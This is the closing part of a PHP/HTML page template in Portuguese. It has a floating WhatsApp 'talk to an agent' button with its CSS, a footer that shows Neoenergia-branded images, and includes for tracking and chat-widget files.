            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
        </svg>
        <span class="whatsapp-text">Falar com atendente</span>
    </a>
    <style>
        .whatsapp-float {
            position: fixed;
            bottom: 24px;
            right: 24px;
            z-index: 50;
            display: flex;
            align-items: center;
            gap: 12px;
            background: #25D366;
            color: white;
            padding: 12px 20px;
            border-radius: 9999px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            transition: all 0.2s;
            text-decoration: none;
        }
        .whatsapp-float:hover {
            background: #20BA5C;
            transform: scale(1.05);
        }
        .whatsapp-text {
            font-weight: 500;
            font-size: 14px;
        }
        @media (max-width: 639px) {
            .whatsapp-text { display: none; }
            .whatsapp-float { padding: 12px; }
        }
    </style>
    <?php endif; ?>

    <!-- Footer - Idêntico ao Lovable -->
    <footer style="background: white; border-top: 4px solid var(--neo-green);">
        <div style="max-width: 1200px; margin: 0 auto; padding: 16px;">
            <!-- Mobile -->
            <img src="assets/footer-mobile.png" alt="Rodapé Neoenergia" style="width: 100%; max-width: 28rem; margin: 0 auto; display: block;" class="footer-mobile">
            <!-- Desktop -->
            <img src="assets/footer-desktop.png" alt="Rodapé Neoenergia" style="width: 100%; display: none;" class="footer-desktop">
        </div>
    </footer>
    <style>
        @media (min-width: 768px) {
            .footer-mobile { display: none !important; }
            .footer-desktop { display: block !important; }
        }
    </style>

<?php include __DIR__ . '/includes/tracking.php'; ?>
<?php include __DIR__ . '/includes/chat-widget.php'; ?>
</body>
</html>
